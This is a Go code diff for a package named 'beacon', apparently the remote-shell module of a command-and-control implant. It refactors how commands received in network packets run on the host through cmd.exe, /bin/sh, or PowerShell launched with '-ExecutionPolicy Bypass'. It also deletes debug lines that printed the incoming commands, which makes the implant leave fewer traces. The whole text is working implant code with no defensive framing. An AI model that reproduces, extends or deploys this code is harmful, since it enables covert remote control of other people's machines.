@@ -5,6 +5,7 @@ import (
 	"beacon/pkg/utils/encoding"
 	"beacon/pkg/utils/packet"
 	"bytes"
+	"context"
 	"fmt"
 	"os/exec"
 	"runtime"
@@ -58,14 +59,7 @@ func StartShellJob(manager *jobs.Manager, sink func([]byte), taskID uint32, comm
 }
 
 func runCommandCapture(job *jobs.Job, raw string, acp int, powershell bool) []byte {
-	var cmd *exec.Cmd
-	if powershell {
-		cmd = exec.CommandContext(job.Context(), "powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", raw)
-	} else if runtime.GOOS == "windows" {
-		cmd = exec.CommandContext(job.Context(), "cmd.exe", "/c", raw)
-	} else {
-		cmd = exec.CommandContext(job.Context(), "/bin/sh", "-c", raw)
-	}
+	cmd := newShellCmd(job.Context(), raw, powershell)
 
 	var out bytes.Buffer
 	cmd.Stdout = &out
@@ -100,20 +94,34 @@ func packExecText(text string) []byte {
 	return out
 }
 
+func newShellCmd(ctx context.Context, raw string, powershell bool) *exec.Cmd {
+	if powershell {
+		if runtime.GOOS == "windows" {
+			return newWindowsShellCmd(ctx, raw, true)
+		}
+		return exec.CommandContext(ctx, "powershell", "-NoProfile", "-Command", raw)
+	}
+	if runtime.GOOS == "windows" {
+		return newWindowsShellCmd(ctx, raw, false)
+	}
+	return exec.CommandContext(ctx, "/bin/sh", "-c", raw)
+}
+
+func windowsShellCmdLine(raw string, powershell bool) string {
+	if powershell {
+		return `powershell.exe -ExecutionPolicy Bypass -Command ` + raw
+	}
+	return `cmd.exe /c ` + raw
+}
+
 // Shell 自动识别操作系统并执行命令
 func Shell(p *packet.Parser, acp int) ([]byte, error) {
 	raw, err := readRawCommand(p, "shell")
 	if err != nil {
 		return nil, err
 	}
-	fmt.Printf("[DEBUG] Shell raw command: %s\n", raw)
 
-	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd.exe", "/c", raw)
-	} else {
-		cmd = exec.Command("/bin/sh", "-c", raw)
-	}
+	cmd := newShellCmd(context.Background(), raw, false)
 
 	// 合并多流输出
 	output, err := cmd.CombinedOutput()
@@ -134,9 +142,8 @@ func PowerShell(p *packet.Parser, acp int) ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	fmt.Printf("[DEBUG] PowerShell raw command: %s\n", raw)
 
-	cmd := exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-Command", raw)
+	cmd := newShellCmd(context.Background(), raw, true)
 
 	output, err := cmd.CombinedOutput()
 
